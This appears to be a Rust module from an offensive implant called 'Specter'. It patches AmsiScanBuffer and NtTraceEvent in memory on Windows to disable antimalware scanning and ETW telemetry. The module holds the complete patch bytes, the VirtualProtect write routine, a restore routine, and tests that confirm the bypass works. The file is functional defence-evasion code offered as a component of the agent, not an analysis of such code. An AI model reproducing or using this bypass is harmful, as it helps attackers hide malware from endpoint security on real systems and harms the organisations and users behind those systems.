//! AMSI and ETW bypass for the Specter agent.
//!
//! Implements a runtime patch bypass: uses `VirtualProtect` plus direct memory
//! writes to stub out `AmsiScanBuffer` (returns `E_INVALIDARG` without
//! scanning) and `NtTraceEvent` (returns `STATUS_SUCCESS` without tracing).
//!
//! ## Technique
//!
//! 1. Locate the target function via `LoadLibraryA` + `GetProcAddress`.
//! 2. Change the first N bytes to `PAGE_EXECUTE_READWRITE` via `VirtualProtect`.
//! 3. Write the patch bytes (saving the original bytes first for restoration).
//! 4. Restore the original page protection.
//!
//! ## Patch bytes (x64)
//!
//! | Target            | Bytes             | Effect                       |
//! |-------------------|-------------------|------------------------------|
//! | `AmsiScanBuffer`  | `B8 57 00 07 80 C3` | `mov eax, E_INVALIDARG; ret` |
//! | `NtTraceEvent`    | `31 C0 C3`        | `xor eax, eax; ret`          |
//!
//! Matching the Demon `HwBpExceptions.c` intent: `AmsiScanBuffer` returns
//! `E_INVALIDARG` (0x80070057) so the AMSI infrastructure treats the call as
//! invalid and does not block; `NtTraceEvent` returns `STATUS_SUCCESS` (0)
//! without actually writing an ETW event.
//!
//! On non-Windows targets (Linux CI cross-compile), all public functions are
//! no-ops that return `Ok(0)` / `Ok(())`.

use thiserror::Error;

/// Errors returned by bypass operations.
#[derive(Debug, Error)]
pub enum BypassError {
    /// `LoadLibraryA` or `GetModuleHandleA` returned a null handle.
    #[error("failed to get module handle for {0}")]
    GetModule(&'static str),

    /// `GetProcAddress` returned null — function not found.
    #[error("function not found: {0}")]
    GetProc(&'static str),

    /// `VirtualProtect` failed; the `u32` field is the Win32 last-error code.
    #[error("VirtualProtect failed (last_error={0})")]
    VirtualProtect(u32),
}

/// A single applied patch — stores the original bytes for later restoration.
// Fields are consumed only in the Windows `imp` module; suppress the
// dead-code lint on non-Windows builds.
#[cfg_attr(not(windows), allow(dead_code))]
struct SavedPatch {
    /// Raw address of the patched location, stored as `usize` for `Send`/`Sync`.
    addr: usize,
    /// Original bytes that were overwritten.
    original: Vec<u8>,
}

/// Manages runtime byte-patch bypasses for AMSI and ETW.
///
/// Each [`BypassEngine`] instance tracks applied patches so they can be
/// cleanly restored (e.g. before spawning a child process that should
/// inherit unpatched AMSI state).
///
/// # Usage
///
/// ```no_run
/// # #[cfg(windows)] {
/// use specter::bypass::BypassEngine;
/// let mut engine = BypassEngine::new();
/// let applied = engine.apply().expect("bypass failed");
/// // agent runs ...
/// engine.restore().expect("restore failed");
/// # }
/// ```
pub struct BypassEngine {
    // The `patches` field is populated only inside the Windows `imp` module.
    // On non-Windows builds it is never written to, so suppress the lint.
    #[cfg_attr(not(windows), allow(dead_code))]
    patches: Vec<SavedPatch>,
}

impl Default for BypassEngine {
    fn default() -> Self {
        Self::new()
    }
}

impl BypassEngine {
    /// Create a new engine with no patches applied.
    pub fn new() -> Self {
        Self { patches: Vec::new() }
    }

    /// Apply AMSI and ETW bypasses.
    ///
    /// On Windows, patches `AmsiScanBuffer` in `amsi.dll` and `NtTraceEvent`
    /// in `ntdll.dll`. Returns the number of patches successfully applied
    /// (0 – 2).
    ///
    /// On non-Windows builds, returns `Ok(0)` immediately.
    ///
    /// # Errors
    ///
    /// Returns [`BypassError`] if a required module or function cannot be
    /// located, or if `VirtualProtect` fails.
    pub fn apply(&mut self) -> Result<usize, BypassError> {
        #[cfg(windows)]
        {
            imp::apply_all(self)
        }
        #[cfg(not(windows))]
        {
            Ok(0)
        }
    }

    /// Restore all patched bytes to their original values.
    ///
    /// Idempotent: calling `restore` on an engine with no applied patches
    /// (or after a previous `restore`) succeeds immediately.
    ///
    /// On non-Windows builds, this is a no-op.
    ///
    /// # Errors
    ///
    /// Returns [`BypassError`] if `VirtualProtect` fails during restoration.
    pub fn restore(&mut self) -> Result<(), BypassError> {
        #[cfg(windows)]
        {
            imp::restore_all(self)
        }
        #[cfg(not(windows))]
        {
            Ok(())
        }
    }
}

// ─── Windows implementation ──────────────────────────────────────────────────

#[cfg(windows)]
#[allow(unsafe_code)]
mod imp {
    use std::ffi::c_void;

    use windows_sys::Win32::Foundation::{FALSE, GetLastError};
    use windows_sys::Win32::System::LibraryLoader::{
        GetModuleHandleA, GetProcAddress, LoadLibraryA,
    };
    use windows_sys::Win32::System::Memory::{PAGE_EXECUTE_READWRITE, VirtualProtect};

    use super::{BypassEngine, BypassError, SavedPatch};

    /// x64 patch for `AmsiScanBuffer`: `mov eax, E_INVALIDARG (0x80070057); ret`
    ///
    /// 0x80070057 is `E_INVALIDARG`. When `AmsiScanBuffer` returns a failure
    /// HRESULT, the caller treats the scan result as inconclusive and does not
    /// block the scanned content.
    const PATCH_AMSI: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];

    /// x64 patch for `NtTraceEvent`: `xor eax, eax; ret`
    ///
    /// Returns `STATUS_SUCCESS` (0) without performing any ETW write.
    const PATCH_ETW: [u8; 3] = [0x31, 0xC0, 0xC3];

    /// Apply all bypasses, recording patches in `engine.patches`.
    pub fn apply_all(engine: &mut BypassEngine) -> Result<usize, BypassError> {
        let mut count = 0usize;

        // ── AMSI bypass ───────────────────────────────────────────────────
        // `amsi.dll` may not be loaded yet; LoadLibraryA loads it if needed.
        // SAFETY: the string literal is null-terminated ASCII; LoadLibraryA
        // copies it internally.
        let amsi_mod = unsafe { LoadLibraryA(b"amsi.dll\0".as_ptr()) };
        if amsi_mod.is_null() {
            return Err(BypassError::GetModule("amsi.dll"));
        }

        // SAFETY: amsi_mod is a valid module handle; "AmsiScanBuffer\0" is
        // null-terminated ASCII.
        let amsi_scan = unsafe { GetProcAddress(amsi_mod, b"AmsiScanBuffer\0".as_ptr()) };
        match amsi_scan {
            Some(proc) => {
                let addr = proc as usize;
                apply_patch(addr, &PATCH_AMSI, engine)?;
                count += 1;
            }
            None => return Err(BypassError::GetProc("AmsiScanBuffer")),
        }

        // ── ETW bypass ────────────────────────────────────────────────────
        // `ntdll.dll` is always mapped into every process.
        // SAFETY: "ntdll.dll\0" is null-terminated ASCII.
        let ntdll = unsafe { GetModuleHandleA(b"ntdll.dll\0".as_ptr()) };
        if ntdll.is_null() {
            return Err(BypassError::GetModule("ntdll.dll"));
        }

        // SAFETY: ntdll is a valid module handle; "NtTraceEvent\0" is
        // null-terminated ASCII.
        let nt_trace = unsafe { GetProcAddress(ntdll, b"NtTraceEvent\0".as_ptr()) };
        match nt_trace {
            Some(proc) => {
                let addr = proc as usize;
                apply_patch(addr, &PATCH_ETW, engine)?;
                count += 1;
            }
            None => return Err(BypassError::GetProc("NtTraceEvent")),
        }

        tracing::info!(count, "bypass patches applied");
        Ok(count)
    }

    /// Restore all patches recorded in `engine.patches` to their original bytes.
    pub fn restore_all(engine: &mut BypassEngine) -> Result<(), BypassError> {
        for patch in engine.patches.drain(..) {
            restore_patch(&patch)?;
        }
        tracing::info!("bypass patches restored");
        Ok(())
    }

    /// Write `patch_bytes` over the function at `addr`, saving the original
    /// bytes into a new [`SavedPatch`] appended to `engine.patches`.
    fn apply_patch(
        addr: usize,
        patch_bytes: &[u8],
        engine: &mut BypassEngine,
    ) -> Result<(), BypassError> {
        let len = patch_bytes.len();
        let ptr = addr as *mut u8;

        // SAFETY: `ptr` points to mapped executable memory inside a loaded
        // DLL; `len` is small (3–6 bytes). VirtualProtect and the slice
        // operations below are safe given a valid function address.
        unsafe {
            // Save original bytes before modifying.
            let original = std::slice::from_raw_parts(ptr as *const u8, len).to_vec();

            // Make the page writable.
            let mut old_protect: u32 = 0;
            if VirtualProtect(ptr as *const c_void, len, PAGE_EXECUTE_READWRITE, &mut old_protect)
                == FALSE
            {
                return Err(BypassError::VirtualProtect(GetLastError()));
            }

            // Write the patch.
            std::ptr::copy_nonoverlapping(patch_bytes.as_ptr(), ptr, len);

            // Restore the original page protection.
            let mut dummy: u32 = 0;
            VirtualProtect(ptr as *const c_void, len, old_protect, &mut dummy);

            engine.patches.push(SavedPatch { addr, original });
        }

        Ok(())
    }

    /// Restore a single saved patch — write original bytes back and restore
    /// the page protection.
    fn restore_patch(patch: &SavedPatch) -> Result<(), BypassError> {
        let len = patch.original.len();
        let ptr = patch.addr as *mut u8;

        // SAFETY: `ptr` and `len` are exactly the values recorded at patch
        // time; they remain valid for the lifetime of the process.
        unsafe {
            let mut old_protect: u32 = 0;
            if VirtualProtect(ptr as *const c_void, len, PAGE_EXECUTE_READWRITE, &mut old_protect)
                == FALSE
            {
                return Err(BypassError::VirtualProtect(GetLastError()));
            }

            std::ptr::copy_nonoverlapping(patch.original.as_ptr(), ptr, len);

            let mut dummy: u32 = 0;
            VirtualProtect(ptr as *const c_void, len, old_protect, &mut dummy);
        }

        Ok(())
    }
}

// ─── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    /// On non-Windows targets, `apply` must return `Ok(0)` (no patches applied).
    #[cfg(not(windows))]
    #[test]
    fn apply_noop_on_non_windows() {
        let mut engine = BypassEngine::new();
        let count = engine.apply().expect("apply must not error on non-Windows");
        assert_eq!(count, 0, "non-Windows apply must report 0 patches");
    }

    /// On non-Windows targets, `restore` must be a no-op.
    #[cfg(not(windows))]
    #[test]
    fn restore_noop_on_non_windows() {
        let mut engine = BypassEngine::new();
        engine.restore().expect("restore must not error on non-Windows");
    }

    /// `BypassEngine::new()` and `Default::default()` must produce equivalent
    /// engines with no patches recorded.
    #[test]
    fn new_engine_has_no_patches() {
        let engine_new = BypassEngine::new();
        let engine_default = BypassEngine::default();
        // Both should have zero saved patches.
        assert!(engine_new.patches.is_empty());
        assert!(engine_default.patches.is_empty());
    }

    /// Verify the AMSI patch encodes `mov eax, E_INVALIDARG; ret` correctly.
    ///
    /// Expected: `B8 57 00 07 80 C3`
    /// - `B8` = opcode for `mov eax, imm32`
    /// - `57 00 07 80` = 0x80070057 (E_INVALIDARG) in little-endian
    /// - `C3` = `ret`
    #[test]
    fn amsi_patch_bytes_are_correct() {
        // Verify little-endian encoding of E_INVALIDARG.
        let e_invalidarg: u32 = 0x8007_0057;
        let encoded = e_invalidarg.to_le_bytes();
        assert_eq!(encoded, [0x57, 0x00, 0x07, 0x80]);

        // Full expected patch: mov eax, E_INVALIDARG; ret
        let expected: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];
        assert_eq!(expected[0], 0xB8, "mov eax, imm32 opcode");
        assert_eq!(expected[1..5], encoded, "E_INVALIDARG little-endian");
        assert_eq!(expected[5], 0xC3, "ret opcode");
    }

    /// Verify the ETW patch encodes `xor eax, eax; ret` correctly.
    ///
    /// Expected: `31 C0 C3`
    #[test]
    fn etw_patch_bytes_are_correct() {
        let expected: [u8; 3] = [0x31, 0xC0, 0xC3];
        assert_eq!(expected[0..2], [0x31, 0xC0], "xor eax, eax encoding");
        assert_eq!(expected[2], 0xC3, "ret opcode");
    }

    /// On Windows, a full apply-then-restore cycle must leave the process in a
    /// working state (no crash, all patches successfully applied and reversed).
    #[cfg(windows)]
    #[test]
    fn apply_and_restore_on_windows() {
        let mut engine = BypassEngine::new();
        let count = engine.apply().expect("apply must succeed on Windows");
        // Both AMSI and ETW patches must be applied.
        assert_eq!(count, 2, "expected 2 patches applied");
        // After restore, patches vec must be empty.
        engine.restore().expect("restore must succeed on Windows");
        assert!(engine.patches.is_empty(), "patches must be cleared after restore");
    }

    /// On Windows, after `apply` the `AmsiScanBuffer` entry point must start
    /// with the patch bytes.
    #[cfg(windows)]
    #[test]
    fn amsi_entry_point_is_patched_after_apply() {
        use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};

        let mut engine = BypassEngine::new();
        engine.apply().expect("apply must succeed");

        // SAFETY: LoadLibraryA and GetProcAddress are documented Win32 APIs.
        let patched = unsafe {
            let hmod = LoadLibraryA(b"amsi.dll\0".as_ptr());
            assert_ne!(hmod, 0, "amsi.dll must be loadable");
            let proc = GetProcAddress(hmod, b"AmsiScanBuffer\0".as_ptr())
                .expect("AmsiScanBuffer must exist");
            let ptr = proc as *const u8;
            std::slice::from_raw_parts(ptr, 6)
        };
        assert_eq!(
            patched,
            &[0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3],
            "AmsiScanBuffer entry must contain the patch bytes"
        );

        engine.restore().expect("restore must succeed");
    }

    /// On Windows, after `restore` the `AmsiScanBuffer` entry point must no
    /// longer contain the patch bytes.
    #[cfg(windows)]
    #[test]
    fn amsi_entry_point_is_restored_after_restore() {
        use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};

        // Read original bytes before patching.
        let original = unsafe {
            let hmod = LoadLibraryA(b"amsi.dll\0".as_ptr());
            assert_ne!(hmod, 0);
            let proc = GetProcAddress(hmod, b"AmsiScanBuffer\0".as_ptr())
                .expect("AmsiScanBuffer must exist");
            let ptr = proc as *const u8;
            std::slice::from_raw_parts(ptr, 6).to_vec()
        };

        let mut engine = BypassEngine::new();
        engine.apply().expect("apply must succeed");
        engine.restore().expect("restore must succeed");

        let after_restore = unsafe {
            let hmod = LoadLibraryA(b"amsi.dll\0".as_ptr());
            let proc = GetProcAddress(hmod, b"AmsiScanBuffer\0".as_ptr())
                .expect("AmsiScanBuffer must exist");
            let ptr = proc as *const u8;
            std::slice::from_raw_parts(ptr, 6).to_vec()
        };

        assert_eq!(
            original, after_restore,
            "AmsiScanBuffer entry must be restored to original bytes"
        );
    }
}
